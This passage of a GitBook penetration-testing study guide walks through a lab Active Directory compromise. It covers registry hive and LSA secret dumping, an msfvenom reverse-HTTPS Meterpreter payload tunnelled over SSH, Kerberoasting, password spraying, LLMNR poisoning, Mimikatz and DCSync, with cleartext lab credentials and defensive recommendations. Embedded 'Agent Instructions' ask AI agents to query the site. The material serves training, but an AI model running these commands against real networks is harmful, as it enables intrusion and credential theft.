+reg save HKLM\SYSTEM SYSTEM.SAVE
+reg save HKLM\SECURITY SECURITY.SAVE
+reg save HKLM\SAM SAM.SAVE
+
+# Download via DNN file manager:
+1. Navigate to /admin/file-management
+2. Download SYSTEM.SAVE, SECURITY.SAVE, SAM.SAVE
+3. Transfer to attack host for analysis
+```
+
+### 🔍 Secretsdump Analysis
+
+```bash wrap
+# Credential extraction
+secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
+
+# Local account hashes:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:[NT_HASH]
+mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:[NT_HASH]
+
+# Domain cached credentials:
+INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#[HASH]
+
+# LSA Secrets:
+DefaultPassword: Gr8hambino!
+# Associated user: hporter (domain account)
+```
+
+### 🎯 Domain Credentials Discovery
+
+```bash wrap
+# First domain credential pair discovered:
+hporter:Gr8hambino!
+# Source: LSA Secrets DefaultPassword
+
+# Validation from SYSTEM shell:
+net user hporter /dom
+# Output: Domain Users group membership confirmed
+# Password last set: 6/1/2022
+# Account active: Yes
+```
+
+## 🔄 Alternative Attack Methods
+
+### 🔀 Reverse Port Forwarding
+
+```bash wrap
+# Scenario: Direct reverse shell from DEV01 to attack host
+
+# 1. Generate payload (target: dmz01 IP)
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.8.120 -f exe -o teams.exe LPORT=443
+
+# 2. Setup multi/handler (attack host)
+use multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost 0.0.0.0
+set lport 7000
+run
+
+# 3. SSH reverse port forwarding
+ssh -i dmz01_key -R 172.16.8.120:443:0.0.0.0:7000 root@TARGET_IP -vN
+
+# 4. Execute payload on DEV01
+teams.exe
+# Result: Meterpreter session through port forwarding
+```
+
+### ⚙️ SSH Configuration Requirements
+
+```bash wrap
+# GatewayPorts configuration (if needed):
+# Edit /etc/ssh/sshd_config on dmz01:
+GatewayPorts yes  # Change from 'no' to 'yes'
+
+# Reload SSH service:
+service sshd reload
+
+# Security consideration:
+- Client approval required for config changes
+- Document all modifications
+- Revert changes post-assessment
+- Note security implications in report
+```
+
+## 🎯 Multiple Access Vectors
+
+### 🔄 Attack Path Diversity
+
+```cmd wrap
+# Method 1: SQL Console → xp_cmdshell
+DNN Admin → Settings → SQL Console → Command execution
+
+# Method 2: File Upload → ASP Web Shell
+DNN Admin → File Extensions → Upload newcmdasp.asp → RCE
+
+# Method 3: Direct Credential Usage
+hporter:Gr8hambino! → SMB/RDP/WinRM access
+
+# Method 4: Pass-the-Hash
+Administrator NT hash → Direct authentication
+```
+
+### 🛡️ Persistence Mechanisms
+
+```bash wrap
+# Local administrator access:
+- SAM database hash extraction
+- Pass-the-hash authentication capability
+- Local admin account compromise
+
+# Domain account access:
+- hporter:Gr8hambino! (cleartext)
+- Domain Users group membership
+- Internal AD enumeration capability
+
+# System-level access:
+- NT AUTHORITY\SYSTEM shell
+- Registry access and modification
+- Service manipulation capabilities
+```
+
+## 🎯 Active Directory Preparation
+
+### 🔍 Domain Intelligence Gathered
+
+```cmd wrap
+# Domain information:
+Domain: INLANEFREIGHT.LOCAL
+Domain Controller: 172.16.8.3
+Domain SID: S-1-5-21-2814148634-3729814499-1637837074
+
+# Compromised accounts:
+hporter (Domain Users) - cleartext password
+Administrator (DEV01 local) - NT hash
+mpalledorous (DEV01 local) - NT hash
+
+# Network positioning:
+- SYSTEM access on DEV01 (172.16.8.20)
+- Root access on dmz01 (172.16.8.120)
+- Direct connectivity to Domain Controller
+```
+
+### 📋 Next Phase Planning
+
+```cmd wrap
+# AD enumeration priorities:
+1. BloodHound data collection
+2. Domain user enumeration
+3. Service account discovery
+4. Group membership analysis
+5. Trust relationship mapping
+
+# Lateral movement opportunities:
+- Kerberoasting attacks
+- ASREPRoasting attempts
+- Password spraying campaigns
+- SMB share enumeration
+- Privilege escalation hunting
+```
+
+## 🎯 HTB Academy Labs
+
+### 📋 Lab Solution Summary
+
+```cmd wrap
+# Lab 1: SAM Database Extraction
+1. DNN admin access → Administrator:D0tn31Nuk3R0ck$$@123
+2. File extension modification → asp,aspx,exe,SAVE
+3. Web shell upload → newcmdasp.asp deployment
+4. PrintSpoofer exploitation → SYSTEM privilege escalation
+5. Registry hive dumping → SAM, SYSTEM, SECURITY
+6. Secretsdump analysis → Administrator NT hash extraction
+
+# Lab 2: Administrator Desktop Flag
+1. SYSTEM shell establishment → PrintSpoofer execution
+2. Privilege verification → NT AUTHORITY\SYSTEM
+3. Flag retrieval → C:\Users\Administrator\Desktop\flag.txt
+```
+
+### 🔍 Key Learning Points
+
+```cmd wrap
+# Technical skills:
+- DNN administrative functionality abuse
+- SQL Server xp_cmdshell exploitation
+- SeImpersonate privilege escalation
+- Windows registry credential extraction
+
+# Professional methodology:
+- Multiple attack vector development
+- Persistence mechanism establishment
+- Evidence collection standards
+- Systematic privilege escalation
+
+# Real-world scenarios:
+- Development environment exploitation
+- Configuration file credential mining
+- Built-in functionality abuse
+- Domain preparation techniques
+```
+
+## 🛡️ Defensive Recommendations
+
+### 🔒 Application Security
+
+```cmd wrap
+# DNN hardening:
+- Disable SQL Console access
+- Restrict file upload extensions
+- Implement admin approval workflows
+- Regular credential rotation
+
+# SQL Server security:
+- Disable xp_cmdshell by default
+- Implement least privilege access
+- Monitor database admin activities
+- Use dedicated service accounts
+
+# File share security:
+- Disable anonymous NFS access
+- Implement proper access controls
+- Encrypt sensitive configuration files
+- Regular share permission audits
+```
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/exploitation-privilege-escalation.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## Lateral Movement
+
+## 🎯 Overview
+
+**Lateral Movement** leverages **domain credentials** for **Active Directory enumeration**, **share hunting**, **Kerberoasting**, and **privilege escalation** across multiple hosts. Use **BloodHound** for attack path discovery, **file share analysis** for credential hunting, and **post-exploitation techniques** for comprehensive domain compromise.
+
+## 🩸 BloodHound AD Enumeration
+
+### 🔍 Data Collection
+
+```bash wrap
+# SharpHound execution (from SYSTEM shell on DEV01)
+SharpHound.exe -c All
+
+# Collection methods enabled:
+Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+
+# Results:
+2022-06-22T10:03:18 [*] Enumeration finished in 00:00:46
+[*] Status: 3641 objects finished
+[*] SharpHound Enumeration Completed! Happy Graphing!
+```
+
+### 🎯 Attack Path Analysis
+
+```cmd wrap
+# hporter account analysis:
+- ForceChangePassword rights over ssmalls user
+- Domain Users group membership
+- Limited direct privileges
+
+# ssmalls account capabilities:
+- Standard domain user access
+- Department Shares read access
+- SYSVOL share access (all domain users)
+
+# Key finding: Domain Users → RDP access to DEV01
+Risk: Medium (Excessive Active Directory Group Privileges)
+```
+
+## 📁 File Share Hunting
+
+### 🔍 Share Discovery & Enumeration
+
+```bash wrap
+# Initial share enumeration (hporter)
+Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
+# Result: Limited access, basic shares only
+
+# Enhanced enumeration (ssmalls)
+proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'
+
+# Discovered shares:
+\\DC01.INLANEFREIGHT.LOCAL\Department Shares (accessible)
+\\DC01.INLANEFREIGHT.LOCAL\SYSVOL (domain users access)
+```
+
+### 💾 Credential Discovery in Shares
+
+```bash wrap
+# Department Shares analysis:
+/IT/Private/Development/SQL Express Backup.ps1
+
+# File content analysis:
+$mySrvConn.Login = "backupadm"
+$mySrvConn.Password = "[REDACTED_PASSWORD]"
+# Discovered: backupadm:[PASSWORD] (SQL backup service account)
+
+# SYSVOL share enumeration:
+\\172.16.8.3\sysvol\INLANEFREIGHT.LOCAL\scripts\adum.vbs
+
+# Legacy credentials found:
+Const cdoUserName = "account@inlanefreight.local"
+Const cdoPassword = "L337^p@$$w0rD"
+# Assessment: Likely outdated (2011/2015 script dates)
+```
+
+## 🎫 Kerberoasting Attack
+
+### 🔍 SPN Account Discovery
+
+```powershell wrap
+# PowerView SPN enumeration
+Import-Module .\PowerView.ps1
+Get-DomainUser * -SPN | Select samaccountname
+
+# Discovered SPN accounts:
+azureconnect, backupjob, krbtgt, mssqlsvc, sqltest, sqlqa, sqldev, mssqladm, svc_sql, sqlprod, sapsso, sapvc, vmwarescvc
+
+# Ticket extraction
+Get-DomainUser * -SPN -verbose | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
+```
+
+### 🔐 Hash Cracking Results
+
+```bash wrap
+# Hashcat attack
+hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt
+
+# Successful crack:
+backupjob:[CRACKED_PASSWORD]
+
+# BloodHound analysis:
+- Account has limited privileges
+- No direct administrative access
+- Document as finding: Weak Kerberos Authentication Configuration
+```
+
+## 🌊 Password Spraying Campaign
+
+### 💥 Domain-Wide Password Attack
+
+```powershell wrap
+# DomainPasswordSpray execution
+Invoke-DomainPasswordSpray -Password Welcome1
+
+# Results:
+[*] Password spraying against 2913 accounts
+[*] SUCCESS! User:kdenunez Password:Welcome1
+[*] SUCCESS! User:mmertle Password:Welcome1
+
+# Assessment:
+- 2 successful authentications
+- Accounts have standard user privileges
+- Document as finding: Weak Active Directory Passwords
+```
+
+### 🔍 Additional Enumeration Techniques
+
+```bash wrap
+# GPP autologin search
+proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
+# Result: No Registry.xml files found
+
+# AD user description analysis
+Get-DomainUser * | select samaccountname,description | ?{$_.Description -ne $null}
+# Found: frontdesk - "ILFreightLobby!" (limited privileges)
+# Document as finding: Passwords in AD User Description Field
+```
+
+## 🖥️ MS01 Host Compromise
+
+### 🔑 WinRM Access Discovery
+
+```bash wrap
+# WinRM port enumeration
+proxychains nmap -sT -p 5985 172.16.8.50
+# Result: 5985/tcp open wsman
+
+# Authentication with backupadm
+proxychains evil-winrm -i 172.16.8.50 -u backupadm
+# Success: Remote shell access to ACADEMY-AEN-MS01
+```
+
+### 🔺 Local Privilege Escalation
+
+```bash wrap
+# Standard privilege checks
+whoami /priv
+# Result: No useful privileges
+
+# Unattend.xml credential discovery
+type c:\panther\unattend.xml
+# Found AutoLogon credentials:
+<Username>ilfserveradm</Username>
+<Password><Value>Sys26Admin</Value></Password>
+
+# User verification
+net user ilfserveradm
+# Result: Remote Desktop Users membership (non-admin)
+```
+
+### 🛠️ Sysax Automation Privilege Escalation
+
+```cmd wrap
+# Vulnerable software discovery:
+C:\Program Files (x86)\SysaxAutomation\
+
+# Exploitation steps:
+1. Create pwn.bat: "net localgroup administrators ilfserveradm /add"
+2. Open sysaxschedscp.exe
+3. Setup Scheduled/Triggered Tasks → Add task (Triggered)
+4. Monitor folder: C:\Users\ilfserveradm\Documents
+5. Run program: C:\Users\ilfserveradm\Documents\pwn.bat
+6. Uncheck "Login as the following user" (runs as SYSTEM)
+7. Create trigger file in monitored directory
+
+# Result: ilfserveradm added to Administrators group
+```
+
+### 💎 Post-Exploitation Credential Harvesting
+
+```bash wrap
+# Mimikatz execution (as local admin)
+mimikatz.exe
+privilege::debug
+token::elevate
+lsadump::secrets
+
+# LSA Secrets discovered:
+Secret: DefaultPassword
+cur/text: DBAilfreight1!
+
+# Registry query for username
+Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
+# Result: DefaultUserName : mssqladm
+
+# Final credential pair:
+mssqladm:DBAilfreight1!
+```
+
+## 🕷️ Network Credential Harvesting
+
+### 🎣 Inveigh LLMNR/NBT-NS Poisoning
+
+```powershell wrap
+# Inveigh execution (as local admin)
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
+
+# Configuration:
+[+] Elevated Privilege Mode = Enabled
+[+] Primary IP Address = 172.16.8.50
+[+] LLMNR Spoofer = Enabled
+[+] SMB Capture = Enabled
+[+] HTTP Capture = Enabled
+
+# Captured credentials:
+[+] SMB(445) NTLMv2 captured for ACADEMY-AEN-DEV\mpalledorous from 172.16.8.20
+# Hash format: NTLMv2 (suitable for offline cracking)
+```
+
+### 📊 Additional Intelligence Gathering
+
+```bash wrap
+# Interesting files discovered:
+c:\budget_data.xlsx          # Potential sensitive data
+c:\Inlanefreight.kdbx       # KeePass database file
+
+# Browser credential hunting:
+lazagne.exe browsers -firefox
+# Result: No stored credentials found
+
+# Assessment notes:
+- Files in unusual locations (security concern)
+- KeePass database (potential password vault)
+- Development environment artifacts
+```
+
+## 🎯 Credential Summary
+
+### 🔐 Compromised Accounts Inventory
+
+```cmd wrap
+# Domain accounts:
+hporter:Gr8hambino!           # Initial domain foothold
+ssmalls:Str0ngpass86!         # Password changed via ForceChangePassword
+kdenunez:Welcome1             # Password spraying result
+mmertle:Welcome1              # Password spraying result
+mssqladm:DBAilfreight1!       # LSA Secrets from MS01
+
+# Local accounts:
+Administrator (DEV01):NT_HASH  # SAM database extraction
+mpalledorous (DEV01):NT_HASH   # SAM database extraction
+ilfserveradm (MS01):Sys26Admin # Unattend.xml discovery
+
+# Legacy/Historical:
+account:L337^p@$$w0rD          # SYSVOL script (outdated)
+frontdesk:ILFreightLobby!      # AD description field
+backupjob:[PASSWORD]           # Kerberoasting result
+```
+
+### 🎯 Access Matrix
+
+```cmd wrap
+# Host access capabilities:
+DEV01 (172.16.8.20):
+- SYSTEM access (PrintSpoofer)
+- Domain joined (AD enumeration)
+- RDP access (all Domain Users)
+
+MS01 (172.16.8.50):
+- Local admin access (Sysax exploit)
+- WinRM connectivity
+- Network position for poisoning attacks
+
+DMZ01 (172.16.8.120):
+- Root access (SSH key)
+- Pivot infrastructure
+- Network monitoring capability
+```
+
+## 🔍 Attack Path Progression
+
+### 📊 Lateral Movement Chain
+
+```cmd wrap
+# Phase 1: Initial domain access
+hporter:Gr8hambino! → Domain Users privileges
+
+# Phase 2: Privilege escalation
+ForceChangePassword → ssmalls account control
+
+# Phase 3: Share enumeration
+Department Shares → SQL backup script → backupadm credentials
+
+# Phase 4: Host compromise
+WinRM access → MS01 foothold → Local admin escalation
+
+# Phase 5: Credential harvesting
+Unattend.xml → AutoLogon → mssqladm discovery
+```
+
+### 🎯 Next Phase Preparation
+
+```cmd wrap
+# Available attack vectors:
+1. mssqladm account exploitation (SQL Server access)
+2. Network poisoning attacks (Inveigh results)
+3. Additional host enumeration (172.16.8.50 fully compromised)
+4. KeePass database analysis (if accessible)
+5. Domain controller attack preparation
+
+# Privilege escalation targets:
+- SQL Server service account privileges
+- Cached credential analysis
+- Additional unattend.xml files
+- Service account hunting
+```
+
+## 🎯 HTB Academy Lab Context
+
+### 📋 Techniques Demonstrated
+
+```cmd wrap
+# Active Directory enumeration:
+- BloodHound data collection and analysis
+- PowerView privilege enumeration
+- Share hunting with CrackMapExec
+- SPN account discovery and Kerberoasting
+
+# Lateral movement methods:
+- ForceChangePassword privilege abuse
+- WinRM service exploitation
+- RDP access with drive redirection
+- Local privilege escalation techniques
+
+# Credential discovery sources:
+- File share configuration files
+- Registry autologon settings
+- LSA Secrets extraction
+- Network traffic poisoning
+```
+
+### 🔍 Professional Methodology
+
+```cmd wrap
+# Systematic approach:
+- Complete domain enumeration before moving
+- Document all discovered credentials
+- Test multiple attack vectors simultaneously
+- Maintain operational security during changes
+
+# Evidence collection:
+- Screenshot all successful authentications
+- Save all discovered configuration files
+- Document privilege escalation steps
+- Track network access changes
+```
+
+## 🛡️ Defensive Recommendations
+
+### 🔒 Active Directory Security
+
+```cmd wrap
+# Account management:
+- Implement least privilege principles
+- Regular password policy enforcement
+- Monitor ForceChangePassword privileges
+- Audit service account permissions
+
+# File share security:
+- Restrict Department Shares access
+- Remove credentials from configuration files
+- Implement proper NTFS permissions
+- Regular share permission audits
+
+# Network security:
+- Disable LLMNR/NBT-NS if not needed
+- Implement network segmentation
+- Monitor for lateral movement patterns
+- Deploy endpoint detection and response
+```
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/lateral-movement.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## Active Directory Compromise
+
+## 🎯 Overview
+
+**Active Directory Compromise** represents the **final phase** of enterprise network penetration testing. Leverage **GenericWrite privileges** for **targeted Kerberoasting**, exploit **Server Admins group membership** for **DCSync attacks**, and achieve **Domain Administrator access** through systematic privilege escalation and credential harvesting.
+
+## 🔍 BloodHound Attack Path Analysis
+
+### 🎯 GenericWrite Privilege Discovery
+
+```cmd wrap
+# mssqladm account analysis:
+- GenericWrite over ttimmons user
+- SQL service account privileges
+- Domain credential access capability
+
+# Attack vector identification:
+GenericWrite → Fake SPN creation → Targeted Kerberoasting → Password cracking
+```
+
+### 📊 Attack Chain Visualization
+
+```cmd wrap
+# Privilege escalation path:
+mssqladm (GenericWrite) → ttimmons (GenericAll) → Server Admins → DCSync
+
+# BloodHound query results:
+1. MSSQLADM@INLANEFREIGHT.LOCAL → GenericWrite → TTIMMONS@INLANEFREIGHT.LOCAL
+2. TTIMMONS@INLANEFREIGHT.LOCAL → GenericAll → SERVER ADMINS@INLANEFREIGHT.LOCAL  
+3. SERVER ADMINS@INLANEFREIGHT.LOCAL → GetChanges/GetChangesAll → INLANEFREIGHT.LOCAL
+```
+
+## 🎫 Targeted Kerberoasting Attack
+
+### 🔧 Fake SPN Creation
+
+```powershell wrap
+# PSCredential object creation
+$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
+
+# Fake SPN assignment
+Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
+
+# Verification:
+[*] Setting 'serviceprincipalname' to 'acmetesting/LEGIT' for object 'ttimmons'
+```
+
+### 🎯 TGS Ticket Extraction
+
+```bash wrap
+# Targeted Kerberoasting attack
+proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
+
+# Results:
+ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
+--------------------  --------  --------  --------------------------  ---------  ----------
+acmetesting/LEGIT     ttimmons            2022-06-01 14:32:18.194423  <never>               
+
+# TGS ticket captured:
+$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$[HASH_DATA]
+```
+
+### 🔐 Password Cracking
+
+```bash wrap
+# Hashcat TGS cracking
+hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
+
+# Successful crack:
+ttimmons:[CRACKED_PASSWORD]
+
+# Attack completion time:
+Time.Started.....: Wed Jun 22 16:32:27 2022 (22 secs)
+Status...........: Cracked
+Progress.........: 10678272/14344385 (74.44%)
+```
+
+## 🔺 Server Admins Group Escalation
+
+### 👥 Group Membership Manipulation
+
+```powershell wrap
+# PSCredential object for ttimmons
+$timpass = ConvertTo-SecureString '[CRACKED_PASSWORD]' -AsPlainText -Force
+$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
+
+# Server Admins group addition
+$group = Convert-NameToSid "Server Admins"
+Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
+
+# Verification:
+[*] Adding member 'ttimmons' to group 'S-1-5-21-2814148634-3729814499-1637837074-1622'
+```
+
+### 🎯 DCSync Privileges Inheritance
+
+```cmd wrap
+# Server Admins group capabilities:
+- GetChanges privilege (INLANEFREIGHT.LOCAL)
+- GetChangesAll privilege (INLANEFREIGHT.LOCAL)
+- DCSync attack capability
+- Complete domain credential access
+
+# BloodHound confirmation:
+SERVER ADMINS → DCSync → INLANEFREIGHT.LOCAL domain
+```
+
+## 🔄 DCSync Attack Execution
+
+### 💎 NTDS Database Extraction
+
+```bash wrap
+# Complete domain credential dump
+proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
+
+# Expected output:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+
+# Key accounts extracted:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:[DOMAIN_ADMIN_HASH]
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[KRBTGT_HASH]
+[ALL_DOMAIN_USERS]:[RESPECTIVE_HASHES]
+```
+
+### 👑 Domain Administrator Access
+
+```bash wrap
+# Pass-the-Hash authentication to DC
+proxychains evil-winrm -i 172.16.8.3 -u Administrator -H [DOMAIN_ADMIN_HASH]
+
+# Verification:
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+inlanefreight\administrator
+
+# Domain Controller access confirmed:
+hostname → DC01
+ipconfig → 172.16.8.3 (Domain Controller)
+```
+
+## 🎯 Post-Compromise Activities
+
+### 📊 Complete Domain Control Validation
+
+```cmd wrap
+# Domain Administrator capabilities:
+- Complete Active Directory control
+- All user account access
+- Group Policy modification rights
+- Trust relationship management
+- Certificate Authority access (if present)
+
+# Evidence collection priorities:
+- Screenshot of Domain Controller access
+- NTDS database dump completion
+- Administrative command execution proof
+- Network topology confirmation
+```
+
+### 🔒 Cleanup and Documentation
+
+```powershell wrap
+# Remove fake SPN (operational security)
+Set-DomainObject -credential $Cred -Identity ttimmons -Clear serviceprincipalname -Verbose
+
+# Remove from Server Admins group
+Remove-DomainGroupMember -Identity "Server Admins" -Members 'ttimmons' -Credential $timcreds -verbose
+
+# Document all changes:
+- Fake SPN creation and removal
+- Group membership modifications
+- Password changes performed
+- Registry/system modifications
+```
+
+## 🏆 Complete Attack Chain Summary
+
+### 🚀 External → Domain Admin Path
+
+```cmd wrap
+# Phase 1: External Reconnaissance
+Nmap scans → DNS zone transfer → Subdomain discovery → 11 web applications
+
+# Phase 2: Initial Foothold  
+Web application testing → Command injection → Reverse shell → TTY upgrade
+
+# Phase 3: Persistence & Privilege Escalation
+Audit log mining → SSH access → GTFOBins → Root access
+
+# Phase 4: Internal Reconnaissance
+SSH pivoting → Host discovery → NFS exploitation → Credential harvesting
+
+# Phase 5: Lateral Movement
+DNN admin access → PrintSpoofer → SYSTEM → Multiple host compromise
+
+# Phase 6: Active Directory Compromise
+BloodHound analysis → GenericWrite abuse → Targeted Kerberoasting → DCSync → Domain Admin
+```
+
+### 📋 Comprehensive Findings Summary
+
+```cmd wrap
+# Critical/High Risk Findings:
+1. Unrestricted File Upload → RCE
+2. Command Injection → System compromise
+3. Insecure File Shares → Credential exposure
+4. Weak Active Directory Passwords → Domain compromise
+5. Excessive AD Group Privileges → Lateral movement
+6. GenericWrite ACL Misconfiguration → Privilege escalation
+7. DCSync Privileges → Complete domain access
+
+# Medium Risk Findings:
+8. HTTP Verb Tampering → Information disclosure
+9. IDOR Vulnerabilities → Data exposure
+10. Directory Listing Enabled → Information leakage
+11. Kerberoasting Vulnerabilities → Credential attacks
+
+# Informational Findings:
+12. Abandoned Test Applications → Attack surface
+13. Legacy Credentials in Scripts → Historical exposure
+14. Passwords in AD Descriptions → Information disclosure
+```
+
+## 🛠️ Tools & Techniques Mastery
+
+### 🔍 Reconnaissance Tools
+
+```bash wrap
+# External enumeration:
+Nmap, DNS zone transfers, EyeWitness, Gobuster, WPScan
+
+# Internal enumeration:  
+BloodHound, SharpHound, PowerView, Snaffler, CrackMapExec
+
+# Credential hunting:
+Secretsdump, Mimikatz, LaZagne, Registry analysis
+```
+
+### ⚔️ Exploitation Techniques
+
+```bash wrap
+# Web application attacks:
+SQL injection, XSS, XXE, SSRF, File upload bypasses
+
+# Privilege escalation:
+PrintSpoofer, GTFOBins, Sysax Automation, Unattend.xml
+
+# Active Directory attacks:
+Kerberoasting, Password spraying, DCSync, ACL abuse
+```
+
+## 🎯 HTB Academy Labs
+
+### 📋 Final Lab Solutions
+
+```cmd wrap
+# Lab 1: Targeted Kerberoasting
+1. BloodHound analysis → GenericWrite identification
+2. PSCredential creation → mssqladm authentication  
+3. Fake SPN assignment → acmetesting/LEGIT
+4. TGS ticket extraction → GetUserSPNs.py
+5. Password cracking → Hashcat success
+6. Password discovery → ttimmons:[PASSWORD]
+
+# Lab 2: Domain Controller Access
+1. Group membership addition → ttimmons to Server Admins
+2. DCSync privilege inheritance → GetChanges/GetChangesAll
+3. NTDS database dump → secretsdump.py execution
+4. Domain Admin hash → Administrator NT hash
+5. DC authentication → Pass-the-Hash WinRM
+6. Flag retrieval → Administrator Desktop access
+
+# Lab 3: NTDS Hash Extraction
+1. DCSync attack execution → Complete credential dump
+2. Administrator hash extraction → Domain Admin access
+3. Evidence collection → NTDS database analysis
+```
+
+### 🔍 Professional Methodology Demonstrated
+
+```cmd wrap
+# Systematic approach:
+- Complete external enumeration before internal pivot
+- Establish multiple persistence mechanisms
+- Document all attack paths and evidence
+- Maintain operational security during testing
+
+# Advanced techniques:
+- Multi-stage privilege escalation chains
+- Complex pivoting and tunneling setups
+- Active Directory attack path exploitation
+- Professional cleanup and documentation
+
+# Real-world application:
+- Enterprise network penetration methodology
+- Complete attack chain from external to Domain Admin
+- Evidence collection for professional reporting
+- Client communication and impact demonstration
+```
+
+## 🛡️ Comprehensive Defensive Recommendations
+
+### 🔒 Active Directory Hardening
+
+```cmd wrap
+# Privilege management:
+- Implement least privilege principles
+- Regular ACL audits and cleanup
+- Monitor privileged group memberships
+- Implement Privileged Access Management (PAM)
+
+# Authentication security:
+- Deploy strong password policies
+- Implement multi-factor authentication
+- Monitor for Kerberoasting attacks
+- Regular credential rotation
+
+# Monitoring and detection:
+- Deploy advanced threat detection
+- Monitor DCSync attack attempts
+- Implement honeypot accounts
+- Regular security assessments
+```
+
+### 🌐 Network Security
+
+```cmd wrap
+# Segmentation:
+- Implement proper network segmentation
+- Deploy zero-trust architecture
+- Restrict lateral movement capabilities
+- Monitor east-west traffic
+
+# Application security:
+- Regular web application security testing
+- Implement secure development practices
+- Deploy Web Application Firewalls
+- Regular vulnerability assessments
+```
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/active-directory-compromise.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## Post-Exploitation
+
+## 🎯 Overview
+
+**Post-Exploitation** activities **maximize assessment value** after achieving Domain Administrator access. Perform **domain password analysis**, establish **double pivoting** for protected networks, exploit **kernel vulnerabilities**, and demonstrate **comprehensive impact** through systematic post-compromise enumeration and additional security assessments.
+
+## 📊 Domain Password Analysis
+
+### 💎 NTDS Database Analysis
+
+```bash wrap
+# Complete credential extraction results:
+- Total password hashes obtained: [COUNT]
+- Password hashes successfully cracked: [COUNT]  
+- Percentage of passwords cracked: [PERCENTAGE]%
+- Domain Admin passwords cracked: [COUNT]
+- Enterprise Admin passwords cracked: [COUNT]
+
+# DPAT analysis tool usage:
+python dpat.py -n ntds_hashes.txt -c cracked_passwords.txt
+# Output: Comprehensive password statistics and visualizations
+```
+
+### 🔍 Password Policy Effectiveness Assessment
+
+```cmd wrap
+# Common password patterns discovered:
+- Top 10 most common passwords
+- Password length distribution analysis
+- Keyboard walk patterns (12qwaszx, etc.)
+- Seasonal password variations
+- Company-specific password themes
+
+# Security recommendations:
+- Implement stronger password complexity requirements
+- Deploy password blacklisting solutions
+- Increase minimum password length requirements
+- Implement regular password rotation policies
+```
+
+## 🔒 Active Directory Security Audit
+
+### 🛡️ PingCastle AD Assessment
+
+```bash wrap
+# Comprehensive AD security analysis
+PingCastle.exe --healthcheck --server DC01.INLANEFREIGHT.LOCAL
+
+# Key areas analyzed:
+- Privileged account security
+- Group membership configurations
+- Trust relationship security
+- Certificate authority configuration
+- GPO security settings
+- Kerberos configuration analysis
+
+# Report integration:
+- Include PingCastle findings in appendices
+- Translate technical findings to business impact
+- Provide prioritized remediation roadmap
+```
+
+### 🔍 Additional AD Enumeration
+
+```cmd wrap
+# Best practice recommendations:
+- Excessive privilege identification
+- Stale account discovery
